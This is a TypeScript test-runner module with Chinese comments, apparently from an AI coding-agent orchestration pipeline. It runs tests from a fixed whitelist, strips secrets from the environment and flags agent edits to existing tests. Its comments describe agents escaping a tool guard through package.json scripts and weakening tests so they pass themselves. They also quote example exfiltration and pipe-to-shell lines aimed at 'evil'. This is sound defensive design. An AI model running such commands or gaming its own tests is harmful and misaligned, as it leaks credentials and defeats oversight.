/**
 * 测试执行器 —— M4「真质量闸门」的**程序侧**执行者。
 *
 * ## 为什么需要它（第一性原理）
 *
 * M3 之前，test 闸门的 `passed` 由 LLM 单判。而 prompt 里逐字写着
 * 「若仓库存在可执行测试,以其结果为准」—— **LLM 没有任何执行能力**，
 * 这句话只能产出幻觉。`code-testing/SKILL.md` 里那句「禁止声称跑过实际未执行的测试」
 * 更直白：没有任何机制能阻止它说谎，只能求它别说。
 *
 * 「跑没跑、退出码是多少」是**事实**，事实不该由语言模型陈述。
 * 本模块把这件事从 LLM 手里收回：编排层直接执行命令、直接读 exit code。
 *
 * ## 与 agent 工具的本质区别（M4 最重要的选型结论，见卡 §6）
 *
 * 跑测试**绝不能**做成 agent 的一个 tool。做成 tool 意味着「执行权仍在 LLM 手里」——
 * 它可以选择不调用、可以调用错的命令、可以编造返回。本模块是**普通 adapter**
 * （与 `github.ts` 同级），由 workflow 直接调用，与 LLM 无关。
 *
 * ## 安全边界：这里同时是 M4 新引入的攻击面
 *
 * 跑测试 = 让程序去执行 **coding agent 写下的代码**。`guard.ts` 拦的是 agent 的
 * **工具调用**，拦不住「agent 写进配置、随后被程序执行」这条旁路。两道防线：
 *
 * 1. **绝不调用 `npm` / `npx`** —— 直接从 `package.json` 的 `scripts.test` 字段取值并交给
 *    `npm` 执行，等于给围栏开一条 RCE 旁路：npm 会连带跑 `pre/post/prepare` 等生命周期钩子，
 *    agent 只要写 `"test": "<任意命令>"`（或 `pre`test）就能拿到任意命令执行权。
 *    本实现**把 `scripts.test` 仅当作「该仓库声明了测试」的信号位**，命令本体从固定白名单
 *    里选（判定依据全部是**程序可验证的文件存在性**，不是 agent 可改的文本）。
 *    不经过 npm，生命周期钩子自然永不触发 —— 比 `npm --ignore-scripts` 更彻底。
 * 2. **子进程 env 剥离密钥** —— 否则 agent 写的一行 `fetch('evil.example/'+process.env.GITHUB_TOKEN)`
 *    就能把 token 带出去。测试不需要任何凭据。
 *
 * 残余风险（诚实记录）：测试代码本身仍是 agent 写的代码，跑它就有代码执行权。
 * 完整封堵需要容器/沙箱隔离，属后续里程碑；本模块做的是「不给它额外递刀」。
 */

import { spawn } from 'node:child_process';
import { existsSync, readdirSync, readFileSync } from 'node:fs';
import type { Dirent } from 'node:fs';
import { join } from 'node:path';

/** 一次测试执行的完整结果 —— 全程由程序写入，**不流经 LLM**。 */
export interface TestRunResult {
  /** 是否真的执行了命令。false 时下游必须把 `testsPassed` 置 null，**不可等价于 true**。 */
  executed: boolean;
  /**
   * 实际执行的命令 —— **可直接复制复跑**（含 `cd` 与完整 argv）。
   * AC-1 要求「人工复跑同命令得到相同 exit code」，所以这里不做美化，
   * 连 node 的绝对路径都保留：换个 node 版本可能改变结果。
   */
  command: string | null;
  /** 命中的 runner 名（jest / vitest / node 内置），供报告与排障。 */
  runner: string | null;
  /** 子进程退出码；`null` 表示没拿到（未执行 / 被信号杀死 / spawn 失败） */
  exitCode: number | null;
  durationMs: number;
  /** 超时被杀 */
  timedOut: boolean;
  /** 输出被尾部截断 */
  truncated: boolean;
  /** stdout+stderr 合并后的尾部片段 */
  outputTail: string;
  /** 执行前在盘上**发现**的测试文件数（0 表示声明了测试但一个都没有） */
  testFileCount: number;
  /**
   * 人话原因。两条语义要分清：
   * - **未执行**的原因是 `no-package-json` / `no-test-script` / `package-json-unparseable` / `spawn-failed`
   * - **已执行**的说明是 `exit-0` / `exit-<n>` / `timeout`
   * 下游据此写 report，避免把「没跑」误读成「跑过了且通过」。
   */
  reason: string;
}

/** 默认超时 120s：覆盖常规单测；死循环靠它兜底（M4-P2-5 / AC-7）。 */
const DEFAULT_TIMEOUT_MS = 120_000;
/** 默认输出上限 4000 字符，取**尾部** —— 失败摘要总在结尾。 */
const DEFAULT_MAX_CHARS = 4000;

/**
 * 子进程环境变量里**必须剥掉**的键（不区分大小写）。
 *
 * 理由：测试代码可能由 agent 写就，`process.env` 一读就能外传。
 * 测试本身不需要任何凭据，故一律不给。
 */
const SECRET_ENV_PATTERN = /(TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|_KEY$|^KEY$|AUTH)/i;

/** 构造子进程 env：保留运行所需（PATH / SystemRoot / TEMP 等），剥掉所有疑似凭据。 */
function sanitizedEnv(): NodeJS.ProcessEnv {
  const out: NodeJS.ProcessEnv = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (SECRET_ENV_PATTERN.test(k)) continue;
    out[k] = v;
  }
  // 让常见测试框架进入非交互/一次性模式，避免 watch 挂住。
  out.CI = '1';
  return out;
}

/** 白名单 runner：命令由程序**从固定表里选**，不取任何外部文本。 */
interface RunnerPlan {
  /** spawn 的 argv（argv[0] 为可执行文件绝对路径） */
  argv: string[];
  /** 人读标签，用于报告。 */
  label: string;
}

/**
 * 探测该仓库能否跑测试，并**解析出要执行的固定命令**。
 *
 * 判定顺序（每一步依据都是可枚举的事实，不依赖 agent 可改的文本内容）：
 * 1. `package.json` 存在且可解析 —— 否则无对象可跑
 * 2. `scripts.test` 字段存在且非空 —— 仅作「该仓库声明了测试」的**信号位**
 * 3. runner 由**文件存在性**决定：
 *    - `node_modules/jest/bin/jest.js` 在 → 走 jest
 *    - `node_modules/vitest/vitest.mjs` 在 → 走 vitest
 *    - 都不在 → 走 Node 内置 test runner（零依赖，靶场就用它）
 *
 * ⚠️ 第 2 步的值**绝不会**出现在 `argv` 里。这是本模块的安全核心，改代码时别破。
 */
export function planTestRun(root: string): { plan: RunnerPlan } | { skip: string } {
  const pkgPath = join(root, 'package.json');
  if (!existsSync(pkgPath)) return { skip: 'no-package-json' };

  let pkg: unknown;
  try {
    pkg = JSON.parse(readFileSync(pkgPath, 'utf8'));
  } catch {
    return { skip: 'package-json-unparseable' };
  }

  const scripts = (pkg as { scripts?: Record<string, unknown> } | null)?.scripts;
  const declared = scripts && typeof scripts.test === 'string' ? scripts.test.trim() : '';
  // 只判「有没有」，**不解析内容**。下面一行是本模块存在的意义所在：
  // 无论 declared 是 "jest" 还是 "curl evil | sh"，对 argv 都没有任何影响。
  if (!declared) return { skip: 'no-test-script' };

  const node = process.execPath;
  const jest = join(root, 'node_modules', 'jest', 'bin', 'jest.js');
  if (existsSync(jest)) {
    return { plan: { argv: [node, jest, '--ci', '--silent'], label: 'jest(本地 node_modules)' } };
  }
  const vitest = join(root, 'node_modules', 'vitest', 'vitest.mjs');
  if (existsSync(vitest)) {
    return { plan: { argv: [node, vitest, 'run', '--reporter=basic'], label: 'vitest(本地 node_modules)' } };
  }
  return { plan: { argv: [node, '--test'], label: 'node 内置 test runner(--test)' } };
}

/** 截断为尾部 maxChars；同时给出是否发生截断。 */
function tail(text: string, maxChars: number): { text: string; truncated: boolean } {
  if (text.length <= maxChars) return { text, truncated: false };
  const omitted = text.length - maxChars;
  return { text: `...(前 ${omitted} 字符已省略)\n${text.slice(-maxChars)}`, truncated: true };
}

/** 遍历时跳过的目录：都不是「被测代码」，且体量大（node_modules 尤甚）。 */
const SKIP_DIRS = new Set([
  'node_modules',
  '.git',
  'dist',
  'build',
  'out',
  'coverage',
  '.next',
  '.cache',
  '.venv',
  'vendor',
]);

/** 遍历条目上限 —— 防止在超大仓库上把「探测」变成一次全盘扫描。 */
const MAX_WALK_ENTRIES = 20_000;

/**
 * 在盘上枚举测试文件（相对仓库根，已排序）。
 *
 * 为什么是**自己走文件系统**而不是问 git：目标目录不保证是 git 仓库
 * （单元测试的临时夹具就不是），而 `git ls-files` 在非仓库下直接失败 →
 * 会把「有测试」误判成「无测试」。这个函数必须是纯粹的文件系统事实。
 */
export function discoverTestFiles(root: string): string[] {
  const found: string[] = [];
  let seen = 0;
  const walk = (dir: string, rel: string): void => {
    if (seen > MAX_WALK_ENTRIES) return;
    let entries: Dirent[];
    try {
      entries = readdirSync(dir, { withFileTypes: true });
    } catch {
      return; // 无权限 / 已被删 → 跳过，不影响其它分支
    }
    for (const e of entries) {
      if (++seen > MAX_WALK_ENTRIES) return;
      const childRel = rel ? `${rel}/${e.name}` : e.name;
      if (e.isDirectory()) {
        if (!SKIP_DIRS.has(e.name)) walk(join(dir, e.name), childRel);
      } else if (isTestFile(childRel)) {
        found.push(childRel);
      }
    }
  };
  walk(root, '');
  return found.sort();
}

/**
 * 执行一次测试。
 *
 * 用异步 `spawn`（而非 `spawnSync`）是因为超时后要**杀进程树**：`spawnSync` 不暴露 pid，
 * 无法 `taskkill /T`。而 jest / `node --test` 都会 fork 子进程跑用例文件，
 * 只杀直接子进程会把孙进程留成孤儿（资源泄漏，且下次跑批可能撞上端口/文件锁）。
 *
 * @param root 目标仓库根目录（= `repoRoot()` = `CODING_REPO_ROOT`）
 */
export function runTests(root: string, opts?: { timeoutMs?: number; maxChars?: number }): Promise<TestRunResult> {
  const timeoutMs = opts?.timeoutMs ?? Number(process.env.TEST_TIMEOUT_MS ?? DEFAULT_TIMEOUT_MS);
  const maxChars = opts?.maxChars ?? Number(process.env.TEST_OUTPUT_MAX_CHARS ?? DEFAULT_MAX_CHARS);

  const planned = planTestRun(root);
  if ('skip' in planned) {
    return Promise.resolve({
      executed: false,
      command: null,
      runner: null,
      exitCode: null,
      durationMs: 0,
      timedOut: false,
      truncated: false,
      outputTail: '',
      testFileCount: 0,
      reason: planned.skip,
    });
  }

  /**
   * ⚠️ 声明了测试但盘上一个测试文件都没有 → **必须判 null，不能判 true**（2026-09-15 实测补）。
   *
   * 为什么：`node --test` 在「零个测试文件」时**退出码是 0**。也就是说，
   * 只要有人在 `package.json` 里声明了 `scripts.test`，而仓库里其实没有测试，
   * 「跑一遍」就会得到 exit 0 —— 一个纯粹的**假通过**：我们什么都没验证，
   * 却会向闸门报告「测试通过」。这正是 M4 存在的理由（把假事实从链路上掐掉）的同构错误，
   * 只不过这次撒谎的不是 LLM，是退出码。
   *
   * 判定用**执行前的盘上发现**（`discoverTestFiles`），而不是事后解析 runner 输出 ——
   * 后者的文案随 runner 版本变化，且 jest / vitest / node 三种格式各不相同。
   *
   * 代价（诚实记录）：若仓库用自定义 `testMatch` 把测试放在我们不认识的路径上，
   * 会被误判成「无测试」。方向是 fail-safe 的 —— 结果是 null（不添绿），不是 true。
   */
  const discovered = discoverTestFiles(root);
  if (discovered.length === 0) {
    return Promise.resolve({
      executed: false,
      command: null,
      runner: planned.plan.label,
      exitCode: null,
      durationMs: 0,
      timedOut: false,
      truncated: false,
      outputTail: '',
      testFileCount: 0,
      reason: 'no-test-files',
    });
  }

  const { argv, label } = planned.plan;
  /**
   * 供人工复跑的命令串（AC-1：「手工复跑同命令得到相同 exit code」）。
   *
   * ⚠️ 路径一律转成**正斜杠**再输出。反斜杠在 Git Bash / POSIX shell 里会被当转义符吃掉
   * （`cd D:\code\x` → `D:codex`），那样这条命令就只剩「看起来能跑」。
   * 正斜杠在 bash / cmd / PowerShell 三种 shell 下都可直接执行，Node 也接受。
   * 不美化 node 的绝对路径 —— 换个 node 版本可能改变结论，复跑要对齐解释器。
   */
  const q = (s: string): string => {
    const fwd = s.replace(/\\/g, '/');
    return /\s/.test(fwd) ? `"${fwd}"` : fwd;
  };
  const command = `cd ${q(root)} && ${argv.map(q).join(' ')}`;

  const t0 = Date.now();
  return new Promise<TestRunResult>(resolve => {
    const child = spawn(argv[0], argv.slice(1), {
      cwd: root,
      env: sanitizedEnv(),
      // detached 让子进程自成进程组：Unix 下可对整组发信号（Windows 走 taskkill /T）。
      detached: process.platform !== 'win32',
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    let buf = '';
    let timedOut = false;
    const collect = (chunk: Buffer): void => {
      buf += chunk.toString('utf8');
      // 防「疯狂打日志的测试」把内存吃光：只留尾部约 3 倍上限。
      if (buf.length > maxChars * 4) buf = buf.slice(-maxChars * 2);
    };
    child.stdout?.on('data', collect);
    child.stderr?.on('data', collect);

    const timer = setTimeout(() => {
      timedOut = true;
      killTree(child.pid);
    }, timeoutMs);

    const finish = (exitCode: number | null): void => {
      clearTimeout(timer);
      const durationMs = Date.now() - t0;
      const t = tail(buf.trim(), maxChars);
      resolve({
        executed: true,
        command,
        runner: label,
        exitCode,
        durationMs,
        timedOut,
        truncated: t.truncated,
        outputTail: t.text,
        testFileCount: discovered.length,
        reason: timedOut ? 'timeout' : exitCode === 0 ? 'exit-0' : `exit-${exitCode}`,
      });
    };

    child.on('error', e => {
      clearTimeout(timer);
      const code = (e as NodeJS.ErrnoException).code ?? 'unknown';
      resolve({
        executed: false,
        command,
        runner: label,
        exitCode: null,
        durationMs: Date.now() - t0,
        timedOut: false,
        truncated: false,
        outputTail: String(e.message),
        testFileCount: discovered.length,
        reason: `spawn-failed:${code}`,
      });
    });
    child.on('close', code => finish(code));
  });
}

/**
 * 杀掉整棵进程树（超时兜底）。
 *
 * Windows 没有进程组信号语义，只能借 `taskkill /T`；POSIX 下子进程已 `detached`，
 * 对其**进程组**发 SIGKILL 可一并带走孙进程。两者都是 best-effort ——
 * 杀不掉也只是留下孤儿，不该让「超时判定」本身失败，故异常一律吞掉。
 */
function killTree(pid: number | undefined): void {
  if (pid === undefined) return;
  try {
    if (process.platform === 'win32') {
      spawn('taskkill', ['/pid', String(pid), '/T', '/F'], { stdio: 'ignore' });
    } else {
      // 负号 = 进程组（detached 后子进程即组长）
      try {
        process.kill(-pid, 'SIGKILL');
      } catch {
        process.kill(pid, 'SIGKILL');
      }
    }
  } catch {
    /* best-effort：杀树失败不影响「超时」这一结论 */
  }
}

/**
 * 测试文件 / 测试基础设施的路径模式（用于 `agentModifiedTests` 检测）。
 *
 * 为什么把**测试基础设施**（配置、setup 文件）也算进来：把 jest 配置里的
 * `testMatch` 改成空数组，效果与删掉测试等价 —— 只盯测试文件本身会漏掉这条。
 *
 * ⚠️ 这里刻意只写**文件路径层面**的判据（可程序化、无歧义）。
 * 「断言有没有被放宽」是语义判断，属 LLM 视野，不在本函数职责内。
 */
const TEST_FILE_PATTERNS: ReadonlyArray<RegExp> = [
  /(^|\/)(test|tests|__tests__|spec)\//i, // 测试目录
  /\.(test|spec)\.(?:[cm]?[jt]sx?)$/i, // foo.test.ts / foo.spec.js
  /(^|\/)test[-_.][^/]+\.(?:[cm]?[jt]s)$/i, // test-helper.ts
  /(^|\/)(jest|vitest|karma|mocha)\.config\.(?:[cm]?[jt]s|json)$/i, // 测试配置
  /(^|\/)jest\.setup\.(?:[cm]?[jt]s)$/i, // 测试 setup
];

/** 单条路径是否命中测试模式。 */
export function isTestFile(filePath: string): boolean {
  const p = String(filePath).replace(/\\/g, '/').replace(/^\.\//, '');
  return TEST_FILE_PATTERNS.some(re => re.test(p));
}

/**
 * 一次改动里「动到测试」的完整画像。
 *
 * 区分 `modified` 与 `added` 是本模块的一处刻意设计（2026-09-15）：
 * 拦的是**自证循环**，不是「碰了测试」这个动作本身。
 * - `modified`（改 / 删既有测试）→ 能把断言改松、让自己通过 → 高危，默认阻断
 * - `added`（新增测试文件）→ 不可能削弱既有断言 → 低危，仅记录
 *
 * 若不区分，一个「顺手给新函数补个测试」的良性 agent 会被误拦 ——
 * 而这恰恰是 M4 靶场路径 A 的真实风险（模型很可能觉得补测试是好习惯）。
 */
export interface TestTouchReport {
  /** 被修改 / 删除 / 重命名的**既有**测试文件（自证风险） */
  modified: string[];
  /** 新增的测试文件（不削弱既有断言） */
  added: string[];
}

/**
 * 从「本次改动的文件 + git 状态」判定 agent 有没有动过测试。
 *
 * ## 为什么这是必需的（自证循环）
 *
 * 需求是自然语言命题，测试是可执行断言，两者之间**不存在自动映射**。
 * 若测试是 agent 自己改的，它完全可以让断言恒真 —— 自己出卷、自己判卷，无信息量。
 * 所以「跑测试」这个动作是否可信，取决于**测试是谁写的**，而不取决于跑没跑。
 *
 * @param changes `gitChangedFilesWithStatus()` 的输出（含未跟踪文件，记为 A）
 */
export function detectAgentTouchedTests(changes: ReadonlyArray<{ path: string; status: string }>): TestTouchReport {
  const modified: string[] = [];
  const added: string[] = [];
  for (const { path: p, status } of changes) {
    if (!isTestFile(p)) continue;
    // `A` = 新增（含未跟踪）。其余（M/D/R…）都算动过既有测试。
    (status === 'A' ? added : modified).push(p);
  }
  return { modified: modified.sort(), added: added.sort() };
}
